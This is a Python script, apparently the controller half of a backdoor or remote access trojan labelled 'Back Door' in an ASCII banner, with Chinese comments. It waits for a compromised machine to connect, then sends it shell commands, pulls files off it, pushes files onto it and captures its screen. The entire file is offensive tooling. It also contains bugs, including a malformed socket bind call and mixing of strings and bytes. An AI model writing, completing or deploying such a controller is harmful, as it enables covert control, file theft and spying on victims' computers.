import socket
import json
import base64

welcome = '''
     ____                _      ____                      
    | __ )   __ _   ___ | | __ |  _ \   ___    ___   _ __ 
    |  _ \  / _` | / __|| |/ / | | | | / _ \  / _ \ | '__|
    | |_) || (_| || (__ |   <  | |_| || (_) || (_) || |   
    |____/  \__,_| \___||_|\_\ |____/  \___/  \___/ |_|   
                                                                
                  Power by chuanxiao                                             
'''
print(welcome)

# 收发命令
def command_send(data):
    json_data = json.dumps(data)
    target.send(json_data)

def command_recv():
    json_data = ""
    while True:
        try:
            json_data += target.recv(1024)
            return json.loads(json_data)
        except ValueError:
            print("BIU BIU BIU~~~")



# 监听
def listener():
    global sock
    global target

    sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)

    # 绑定IP和端口
    sock.bind("127.0.0.1",54321)
    sock.listen(5)
    print("The listener is starting... ... ...")

    target,ip = sock.accept()
    print("[+] -> Gotcha!")



# 控制台
def console():
    while True:
        command = input("<Yoo>: ")
        command_send(command)

        # 自定义的一些命令
        if command == "exit":
            break
        # 跳目录
        elif command[:2] == "cd" and len(command) > 1:
            continue
        # 上传
        elif command[:6] == "upload":
            try:
                with open(command[7:],"rb") as upload_file:
                    command_send(base64.b64encode(upload_file.read()))
            except:
                failed_message = "[*] => Upload Failed, Fuck!!!"
                command_send(base64.b64encode(failed_message))
        # 下载
        elif command[:8] == "download":
            with open(command[9:],"wb") as download_file:
                recv_message = command_recv()
                download_file.write(base64.b64decode(recv_message))
        # 截屏
        elif command[:10] == "screenshot":
            count = 0
            with open("number%d" % count,"wb") as pic:
                image_message = command_recv()
                image_decoded = base64.b64decode(image_message)
                if image_decoded[:3] == "[*]":
                    print(image_decoded)
                else:
                    pic.write(image_decoded)
                    count += 1
        else:
            msg = command_recv()
            print(msg)

# 结束
listener()
console()
sock.close()